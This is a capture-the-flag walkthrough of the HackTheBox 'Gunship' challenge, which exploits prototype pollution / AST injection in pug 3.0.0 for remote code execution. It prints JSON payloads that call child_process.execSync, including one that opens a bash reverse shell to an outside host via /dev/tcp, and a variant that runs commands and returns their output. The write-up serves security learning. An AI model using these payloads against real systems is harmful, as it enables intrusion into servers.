# HackTheBox-Gunship

We are giving an archive file to download which is password protected with `hackthebox`

<img src="https://i.imgur.com/9AULt0y.png"/>

On extracting the archive we can some files , also let's look at the web page

<img src="https://i.imgur.com/B5VZE37.png"/>

At the bottom we can see an input field

<img src="https://i.imgur.com/zU2RzWx.png"/>

If we try to enter a random name it will tell us to enter the existing name of an artist

<img src="https://i.imgur.com/cD6OVRa.png"/>

We can see two artists names in Gunship's timeline

<img src="https://i.imgur.com/2o1liNP.png"/>

And these are valid

<img src="https://i.imgur.com/YreEn0D.png"/>

If we look at the source code of `index.js` we can clearly see which names it accepts 

<img src="https://i.imgur.com/nGa059G.png"/>

But there's something else to note as well as this node js application is using `pug` module and we look at the version it's 3.0.0 which we can search on google for vulnerabilites which is vulnerable to `prototype pollution`

<img src="https://i.imgur.com/54sFkVk.png"/>

https://blog.p6.is/AST-Injection/#Pug

Now we cannot use the Poc which is used in the above link as we require to make a POST request and in this case we can't make any requests through ourselves as the express js  would send 404 status code and won't deal with any request

<img src="https://i.imgur.com/oBF11kc.png"/>

So we could use `burp suite` to intercept the request and our exploit along with the data that is being submitted

```json
{
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
    }
}
```

We may need to edit this as we can't get a reverse shell as we are given a public IP so we could just only try to execute commands

```json
{
    "artist.name": "Westaway",
    "__proto__.block": 
    {
        "type": "Text",
        "line": "test;process.mainModule.require('child_process').execSync(`id`)",
        "val": "THIS IS THE VALUE"
    } 
}
```

<img src="https://i.imgur.com/DNgAuhI.png"/>

Here we cannot see the command that we want to execute so we need to use `return` keyword that would return the output of the command

<img src="https://i.imgur.com/HOGicBP.png"/>

It's returning in buffer format so we need to change the encoding and we can do that by adding `{encoding:'utf-8'}`

<img src="https://i.imgur.com/uGKJ2uy.png"/>

For the flag as the flag file name is a randomly generated name

<img src="https://i.imgur.com/u6hWHbz.png"/>

<img src="https://i.imgur.com/TPVcWWX.png"/>